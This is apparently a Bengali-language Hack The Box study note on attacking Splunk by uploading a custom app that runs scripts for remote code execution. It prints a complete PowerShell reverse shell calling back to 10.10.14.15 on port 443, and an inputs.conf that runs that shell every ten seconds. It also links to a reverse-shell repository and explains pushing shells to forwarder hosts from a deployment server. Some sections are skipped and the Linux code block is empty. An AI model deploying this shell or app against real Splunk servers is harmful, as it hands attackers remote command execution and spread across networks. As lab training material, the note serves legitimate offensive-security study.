# Attacking Splunk

## 1. Built-In Functionality Abuse

Splunk-এ custom application তৈরি করে Python, Batch, Bash বা PowerShell script চালিয়ে RCE পাওয়া যায়।

Target Windows server হলে Python (Splunk-এর সঙ্গে installed) অথবা PowerShell ব্যবহার করা যায়।

সহায়ক GitHub repository: [https://github.com/0xjpuff/reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk?utm_source=chatgpt.com)

- [Python script (rev.py)](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py?utm_source=chatgpt.com)
- [PowerShell script (run.ps1)](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1?utm_source=chatgpt.com)

## 2. Custom App তৈরি

প্রথমে এই directory structure তৈরি করতে হবে:

```
00Luffy00@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

- `bin/` → যেসব script চালাব (এখানে PowerShell reverse shell)।
- `default/` → `inputs.conf` file থাকবে।

### PowerShell Reverse Shell

```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

নিজের IP ও port অনুযায়ী hardcoded IP address এবং port পরিবর্তন করতে হবে।

## 3. inputs.conf

[inputs.conf documentation](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf?utm_source=chatgpt.com)

এই file Splunk-কে কোন script চালাতে হবে এবং কী condition থাকবে তা বলে।

- `disabled = 0` → App enabled।
- `interval = 10` → প্রতি 10 সেকেন্ডে script চালাবে।
- Interval-এর unit সবসময় seconds।
- `interval` setting না থাকলে input/script চলবে না।

```
00Luffy00@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

## 8. Linux Host হলে

Linux host হলে tarball তৈরি ও upload করার আগে `rev.py` Python script edit করতে হবে। বাকি process একই থাকবে। Netcat listener-এ reverse shell পাওয়া যাবে।

```

```

## 9. Deployment Server থেকে অন্য Host-এ RCE

Compromised Splunk host যদি Deployment Server হয়, তাহলে Universal Forwarders installed থাকা অন্য host-গুলোতেও RCE সম্ভব হতে পারে।

অন্য host-এ reverse shell পাঠাতে application রাখতে হবে:

```
$SPLUNK_HOME/etc/deployment-apps
```

Windows-heavy environment হলে PowerShell reverse shell ব্যবহার করতে হবে, কারণ Universal Forwarder-এ Splunk Server-এর মতো Python installed থাকে না।
